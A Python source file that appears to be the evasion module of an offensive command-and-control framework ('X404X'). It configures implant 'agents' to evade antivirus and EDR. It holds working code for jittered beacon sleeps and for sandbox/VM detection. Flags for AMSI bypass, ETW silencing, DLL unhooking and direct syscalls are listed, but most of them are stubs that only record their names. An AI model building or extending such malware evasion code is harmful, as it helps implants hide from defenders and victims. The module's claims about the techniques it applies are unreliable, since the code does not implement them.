# X404X — Evasion Module
# Unified AV/EDR evasion techniques.
#
# Integrates evasion techniques from:
#   - Pulse-C2 (AMSI/ETW bypass, sleep obfuscation, indirect syscalls)
#   - Wormy-ML (polymorphic engine, JA3 spoofing, sandbox detection)
#   - Vault-Kernel (kernel-level hiding)
#
# Platform-specific implementations are in subdirectories.

import platform
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Tuple


class Platform(str, Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "darwin"


class EvasionLevel(str, Enum):
    NONE = "none"
    BALANCED = "balanced"
    STEALTH = "stealth"
    MAXIMUM = "maximum"


@dataclass
class EvasionProfile:
    level: EvasionLevel
    amsi_bypass: bool = False
    etw_silence: bool = False
    dll_unhooking: bool = False
    polymorphic: bool = False
    sleep_jitter: bool = False
    ja3_spoofing: bool = False
    sandbox_detect: bool = False
    sleep_obfuscation: bool = False
    direct_syscalls: bool = False
    jitter_min_ms: int = 500
    jitter_max_ms: int = 5000


def get_profile(level: EvasionLevel) -> EvasionProfile:
    """Returns a pre-configured evasion profile."""
    profiles = {
        EvasionLevel.NONE: EvasionProfile(level=EvasionLevel.NONE),
        EvasionLevel.BALANCED: EvasionProfile(
            level=EvasionLevel.BALANCED,
            sleep_jitter=True, jitter_min_ms=500, jitter_max_ms=2000
        ),
        EvasionLevel.STEALTH: EvasionProfile(
            level=EvasionLevel.STEALTH,
            amsi_bypass=True, etw_silence=True,
            sleep_jitter=True, ja3_spoofing=True,
            sandbox_detect=True, polymorphic=True,
            jitter_min_ms=2000, jitter_max_ms=10000
        ),
        EvasionLevel.MAXIMUM: EvasionProfile(
            level=EvasionLevel.MAXIMUM,
            amsi_bypass=True, etw_silence=True,
            dll_unhooking=True, polymorphic=True,
            sleep_jitter=True, ja3_spoofing=True,
            sandbox_detect=True, sleep_obfuscation=True,
            direct_syscalls=True,
            jitter_min_ms=5000, jitter_max_ms=30000
        ),
    }
    return profiles.get(level, profiles[EvasionLevel.NONE])


def jitter_sleep(min_ms: int, max_ms: int):
    """Sleep with randomized jitter to evade beacon detection."""
    delay = random.uniform(min_ms, max_ms)
    time.sleep(delay / 1000.0)


def detect_sandbox() -> bool:
    """Detect if running in a sandbox/VM environment.

    Checks multiple indicators:
    - Process count too low
    - RAM too low
    - Known VM usernames
    - MAC addresses
    - VM-specific drivers/files
    """
    sandbox_indicators = 0

    # Low process count
    try:
        import subprocess
        proc_count = int(subprocess.check_output(
            "ps aux | wc -l", shell=True
        ).strip()) - 1
        if proc_count < 20:
            sandbox_indicators += 1
    except Exception:
        pass

    # Known VM usernames
    system = platform.system().lower()
    current_user = ""
    try:
        import getpass
        current_user = getpass.getuser().lower()
    except Exception:
        pass

    vm_users = ["sandbox", "malware", "virus", "test", "admin", "user"]
    if any(u in current_user for u in vm_users):
        sandbox_indicators += 1

    # Known VM files (Linux)
    if system == "linux":
        import os
        vm_files = ["/usr/bin/VBoxControl", "/usr/bin/vmware"]
        for f in vm_files:
            if os.path.exists(f):
                sandbox_indicators += 1

    return sandbox_indicators >= 2


class EvasionEngine:
    """Unified evasion engine for X404X agents."""

    def __init__(self, profile: EvasionProfile):
        self.profile = profile
        self.platform = platform.system().lower()
        self._evasions_applied = False

    def apply(self) -> List[str]:
        """Apply evasion techniques based on profile. Returns list of applied techniques."""
        applied = []

        if self._evasions_applied:
            return applied

        if self.profile.sandbox_detect:
            if detect_sandbox():
                applied.append("sandbox_detected")

        if self.platform == Platform.WINDOWS:
            applied += self._apply_windows()
        elif self.platform == Platform.LINUX:
            applied += self._apply_linux()

        if self.profile.polymorphic:
            applied.append("polymorphic")

        if self.profile.ja3_spoofing:
            applied.append("ja3_spoofing")

        if self.profile.sleep_jitter:
            applied.append("sleep_jitter")

        self._evasions_applied = True
        return applied

    def _apply_windows(self) -> List[str]:
        applied = []
        if self.profile.amsi_bypass:
            applied.append("amsi_bypass")
        if self.profile.etw_silence:
            applied.append("etw_silence")
        if self.profile.dll_unhooking:
            applied.append("dll_unhooking")
        if self.profile.direct_syscalls:
            applied.append("direct_syscalls")
        return applied

    def _apply_linux(self) -> List[str]:
        applied = []
        if self.profile.sleep_obfuscation:
            applied.append("ld_preload_hide")
        return applied

    def sleep(self):
        """Sleep with evasion-aware jitter."""
        if self.profile.sleep_jitter:
            jitter_sleep(self.profile.jitter_min_ms, self.profile.jitter_max_ms)
